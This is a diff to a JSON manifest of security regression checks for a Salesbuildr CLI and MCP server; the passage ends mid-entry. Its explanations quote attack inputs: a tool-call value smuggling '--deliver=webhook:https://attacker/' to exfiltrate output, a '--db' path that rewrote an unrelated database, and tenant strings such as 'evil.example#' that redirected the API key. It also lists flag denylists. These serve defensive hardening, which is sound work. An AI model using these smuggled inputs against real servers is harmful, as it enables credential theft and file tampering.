@@ -14,16 +14,12 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
      "file": "cli/internal/cli/doctor.go",
      "contains": "doctorIsInfoKey(k)"
-    },
-    {
-     "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorBaseURLIsPlaceholder(cfg.BaseURL)"
     },
     {
      "file": "cli/internal/cli/doctor.go",
@@ -36,8 +32,51 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(doctorBase)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedTemplate(doctorBase)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedTemplate(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
-   ]
+   ],
+   "class": "doctor-truth"
   },
   {
    "id": "install-credentials-declared-on-every-channel",
@@ -91,357 +130,448 @@
      "contains": "\"SALESBUILDR_TENANT\":",
      "min_count": 3
     }
-   ]
+   ],
+   "class": "docs"
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
+   "id": "no-response-cache",
+   "class": "local-data",
+   "summary": "The on-disk response cache is off on every client: raw Salesbuildr bodies never sit in cache files.",
+   "why": "Salesbuildr responses (companies, opportunities, quotes) have no business in cache files. c.NoCache = true in guardClient (salesbuildr_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached. The shared credential kit (credkit-wiring) would withhold a cache file carrying a held credential, but it does not stop ordinary response data being cached, so this stays.",
    "status": "active",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "c.NoCache = true",
      "code_only": true
     }
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Salesbuildr state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/salesbuildr_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to salesbuildr from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to salesbuildr from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to salesbuildr from the gradient 4.34.2 reprint (pax8/microsoft-graph lineage; one credential layer across the fleet).",
    "status": "active",
    "asserts": [
     {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
+     "code_only": true
     },
     {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
+     "file": "cli/internal/mcp/cobratree/salesbuildr_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
+     "code_only": true
     },
     {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
+     "file": "cli/internal/mcp/salesbuildr_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/salesbuildrblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to salesbuildr from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to salesbuildr from the gradient 4.34.2 reprint (pax8/microsoft-graph lineage; one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "README.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
     },
     {
      "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
     },
     {
      "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
+     "not_contains": "salesbuildr-public-pp-cli/config.toml"
     }
    ]
   },
   {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
+   "id": "dry-run-sends-nothing",
    "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Salesbuildr whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to salesbuildr from the gradient 4.34.2 reprint (pax8/microsoft-graph lineage; one credential layer across the fleet).",
    "asserts": [
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "inner = dryRunTripper{}",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
+     "file": "cli/internal/salesbuildrblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
      "code_only": true
     }
-   ]
+   ],
+   "class": "write-safety"
   },
   {
-   "id": "secret-echo-decoded-funnel",
-   "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "id": "mcp-endpoint-write-confirm",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/salesbuildr_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Salesbuildr: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to salesbuildr from the gradient 4.34.2 reprint (pax8/microsoft-graph lineage; one credential layer across the fleet).",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/salesbuildr_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
+     "file": "cli/internal/mcp/salesbuildr_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
+     "file": "cli/internal/salesbuildrblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
+     "file": "cli/internal/salesbuildrblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "write-safety"
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "status": "active",
+   "summary": "config.toml never holds a credential: save keeps base_url without its userinfo, query and fragment (baseURLWithoutCredentials) and leaves out every credential-named header and every header whose value, raw or decoded (base64, base32, hex, percent, up to three layers), repeats a configured or environment credential (headersWithoutCredentials), warning for each; the legacy scrub writes through the same filter; the write goes through cliutil.AtomicWriteCredentialFile, a declared kit exemption. The 0600 credential store is unchanged.",
+   "why": "Codex r1 class credential-persisted-outside-the-store: `SALESBUILDR_BASE_URL='https://app.usesalesbuildr.com/api?api_key=X' auth set-token` wrote X (and a userinfo password, a held secret under any query name, a token_url query secret) into config.toml, because the generated save persists base_url and token_url as configured. Work order credential rule: nothing but the 0600 credential store holds a credential. Hand file internal/config/salesbuildr_persist.go; three anchored lines in the generated config.go (tools/apply_credential_rules.py). TestConfigFileNeverHoldsACredential failed on the generated save (seen/r1-config-file-credential-seen-failing.log). Ported to salesbuildr from the gradient 4.34.2 reprint (pax8/microsoft-graph lineage; one credential layer across the fleet). Kit adoption: the shared credential kit does not cover config.toml (a declared exemption, a credential source in Files), so credential-persisted-outside-the-store stays a hand-fix; the held-value funnel check was replaced by an explicit header filter (gradient's baseURLWithoutCredentials for base_url). TestConfigHeaderNeverKeepsTheNewKey (credwire) runs the built binary and was seen failing on the pre-kit tree (d814276a58, .review/seen/).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "persisted.BaseURL = baseURLWithoutCredentials(persisted.BaseURL)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
+     "file": "cli/internal/config/config.go",
+     "contains": "persisted.Headers = headersWithoutCredentials(persisted.Headers, c)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := refuseCredentialInConfigFile(persist); err != nil {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
+     "file": "cli/internal/config/config.go",
+     "contains": "scrubbed := persistedWithoutCredentials(legacy.persisted(), c)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
+     "file": "cli/internal/config/salesbuildr_persist.go",
+     "contains": "func persistedWithoutCredentials(p persistedConfig, c *Config) persistedConfig {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/config/salesbuildr_persist.go",
+     "contains": "func baseURLWithoutCredentials(raw string) string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
+     "file": "cli/internal/config/salesbuildr_persist.go",
+     "contains": "func headersWithoutCredentials(h map[string]string, c *Config) map[string]string {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/config/salesbuildr_persist_test.go",
+     "contains": "func TestSavedConfigFileKeepsNoCredential(t *testing.T) {",
      "code_only": true
     },
+    {
+     "file": "cli/internal/config/salesbuildr_persist_test.go",
+     "contains": "func TestHeadersWithoutCredentials(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/open_classes_test.go",
+     "contains": "func TestConfigHeaderNeverKeepsTheNewKey(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/salesbuildrblackbox/config_file_test.go",
+     "contains": "func TestConfigFileNeverHoldsACredential(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "secret-persisted"
+  },
+  {
+   "id": "api-origin-pinned",
+   "status": "active",
+   "summary": "The api-key header and every API request go only to the scheme, host and port of the RESOLVED API base URL (https://<SALESBUILDR_TENANT>.salesbuildr.com/public-api, or SALESBUILDR_BASE_URL); every redirect hop must stay on that origin and a non-ASCII host never matches. SALESBUILDR_TENANT must be one DNS label and not the shipped placeholder your-tenant, else every request is refused (ErrTenantInvalid). Installed on every CLI, novel and MCP client by registerClientHook (internal/cli/salesbuildr_guard.go)",
+   "why": "Credential rule host pinning: the generated client sends the api-key header to whatever URL it is handed and splices {tenant} into the base URL as a raw string (internal/client/url.go buildURL), so a tenant such as `evil.example#` or `u@evil.example` moved the host and the key went with it. The pin is taken from the resolved URL (client.ResolvedBaseURL with the config's template vars); the guard ported from gradient url.Parse'd the {tenant} template, pinned nothing and refused every tenant request (seen/tenant-pin-seen-failing.log). The tenant refusal is cli.TenantPinnable, which credwire.showBaseURL also calls so the kit's allowed origin is the pinned host (credkit-wiring).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "func checkPin(pin string, req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "if o := normalizedOrigin(req.URL); o == \"\" || o != pin {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "hc.Transport = originPinTripper{pin: pin, refusal: refusal, next: inner}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "registerClientHook(func(c *client.Client) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "func pinnedOrigin(c *client.Client) (string, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "resolved := client.ResolvedBaseURL(c.BaseURL, vars)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_cred_rules_test.go",
+     "contains": "func TestOriginPinKeepsTheTokenOnTheAPIHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_cred_rules_test.go",
+     "contains": "func TestPinAllowsOnlyTheAPIOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_cred_rules_test.go",
+     "contains": "func TestTenantTemplatePinsTheResolvedHost(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_cred_rules_test.go",
+     "contains": "func TestGuardWrapsTheTransport(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/salesbuildr_guard.go",
+     "contains": "if strings.Contains(c.BaseURL, \"{tenant}\") && !TenantPinnable(vars[\"tenant\"]) {",
+     "code_only": true
